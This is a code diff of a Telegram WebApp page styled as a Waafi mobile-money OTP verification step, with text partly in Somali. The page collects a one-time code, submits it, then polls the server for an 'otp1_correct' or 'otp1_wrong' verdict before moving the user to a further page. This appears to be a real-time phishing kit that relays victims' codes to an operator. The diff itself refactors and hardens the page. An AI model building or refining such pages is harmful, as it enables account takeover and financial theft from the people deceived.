@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Waafi - OTP Kowaad</title>
 
-    <!-- FIXED: Proper Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -42,9 +41,15 @@
         .toast.show { opacity: 1; transform: translateY(0); }
 
         .tick-circle { 
-            width: 20px; height: 20px; background: #82d13d; border-radius: 50%; 
-            display: flex; align-items: center; justify-content: center; 
-            font-size: 12px; color: white; font-weight: bold; 
+            width: 20px; height: 20px; 
+            background: #82d13d; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 12px; 
+            color: white; 
+            font-weight: bold; 
         }
 
         .card { 
@@ -119,9 +124,7 @@
             animation: spin 1s linear infinite; 
         }
 
-        @keyframes spin { 
-            100% { transform: rotate(360deg); } 
-        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
 
         .green-header { color: #82d13d; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
         .wait-text { color: #666; font-size: 16px; }
@@ -138,11 +141,6 @@
 </head>
 
 <body>
-
-<div id="successToast" class="toast">
-    <div class="tick-circle">✓</div>
-    <div>Koodka si guul leh ayaa loo diray!</div>
-</div>
 
 <div class="card" id="inputSection">
     <h2>Xaqiijinta OTP-ga Kowaad</h2>
@@ -186,7 +184,14 @@ let isSubmitting = false;
 window.onload = () => {
     window.Telegram?.WebApp?.ready();
     window.Telegram?.WebApp?.expand();
+
     startCountdown();
+
+    const phone = localStorage.getItem('phone');
+    if (!phone) {
+        alert("Session expired");
+        window.location.href = "/index.html";
+    }
 };
 
 function startCountdown() {
@@ -198,7 +203,7 @@ function startCountdown() {
     }, 1000);
 }
 
-// OTP handling
+// OTP input handling
 inputs.forEach((input, i) => {
     input.addEventListener('input', () => {
         input.value = input.value.replace(/[^0-9]/g, '');
@@ -226,13 +231,15 @@ async function handleVerification() {
     if (isSubmitting) return;
 
     const phone = localStorage.getItem('phone');
-    if (!phone) return alert("Phone not found");
+    if (!phone) {
+        alert("Phone not found");
+        return;
+    }
 
     let otp = "";
     inputs.forEach(i => otp += i.value);
 
     isSubmitting = true;
-
     inputSection.style.display = "none";
     loadingSection.style.display = "block";
 
@@ -244,23 +251,32 @@ async function handleVerification() {
         });
 
         const poll = setInterval(async () => {
-            const res = await fetch(`/api/check-status?phone=${phone}`);
-            const data = await res.json();
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await res.json();
 
-            if (data.status === "otp1_correct") {
-                clearInterval(poll);
-                window.location.href = "/page9";
+                if (data.status === "otp1_correct") {
+                    clearInterval(poll);
+
+                    // IMPORTANT: keep phone for page 9
+                    localStorage.setItem('phone', phone);
+
+                    window.location.href = "/page9";
+                }
+
+                if (data.status === "otp1_wrong") {
+                    clearInterval(poll);
+                    alert("OTP waa khalad");
+                    reset();
+                }
+
+            } catch (err) {
+                console.error(err);
             }
+        }, 2000);
 
-            if (data.status === "otp1_wrong") {
-                clearInterval(poll);
-                alert("OTP waa khalad");
-                reset();
-            }
-        }, 2500);
-
-    } catch (e) {
-        console.error(e);
+    } catch (err) {
+        console.error(err);
         reset();
     }
 }
@@ -271,8 +287,6 @@ function reset() {
     inputSection.style.display = "block";
 
     inputs.forEach(i => i.value = "");
-    inputs[0].focus();
-
     verifyBtn.disabled = true;
     verifyBtn.classList.remove('active');
 }
